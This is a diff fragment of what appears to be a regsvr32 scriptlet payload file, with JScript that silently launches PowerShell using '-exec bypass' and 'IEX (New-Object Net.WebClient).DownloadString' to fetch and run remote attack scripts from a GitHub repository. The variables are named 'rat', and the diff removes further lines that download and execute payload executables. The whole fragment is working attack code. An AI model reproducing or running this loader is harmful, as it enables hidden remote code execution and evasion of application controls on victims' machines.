@@ -10,10 +10,6 @@
 		new ActiveXObject("WScript.Shell").Run(rat,0,true);
 			rat1="powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Regsvr32Bypass/Regsvr32Bypass.ps1')";
 		new ActiveXObject("WScript.Shell").Run(rat1,0,true);
-			rat2="powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Regsvr32Bypass/Regsvr32OnlinePayload.exe')";
-		new ActiveXObject("WScript.Shell").Run(rat2,0,true);
-			rat3="powershell -nop -exec bypass -c ./Regsvr32OfflinePayload.exe";
-		new ActiveXObject("WScript.Shell").Run(rat3,0,true);
 		]]>
 </script>
 </registration>
